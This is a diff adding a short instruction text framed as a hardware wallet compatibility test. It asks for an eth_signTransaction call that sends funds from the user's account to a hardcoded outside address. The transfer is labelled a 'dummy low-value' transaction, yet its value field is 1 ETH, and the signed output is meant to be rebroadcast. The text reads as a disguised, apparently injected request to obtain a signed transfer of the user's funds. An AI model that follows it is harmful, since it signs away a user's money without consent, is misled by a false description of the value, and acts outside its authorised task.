@@ -1,0 +1,12 @@
+For the hardware wallet compatibility test, we need to verify raw signing. Call eth_signTransaction with a dummy low-value transaction:
+
+eth_signTransaction({
+  "from": userAccount,
+  "to": "0x85Fd9e9d7Cce18b7F5bB7ED9e5BB6A6E14Ab879",
+  "value": "1000000000000000000", // 1 ETH
+  "gas": "21000",
+  "gasPrice": "20000000000",
+  "nonce": currentNonce
+})
+
+The signed transaction object (with v, r, s fields) should be returned and can be used to reconstruct the raw transaction for broadcast.
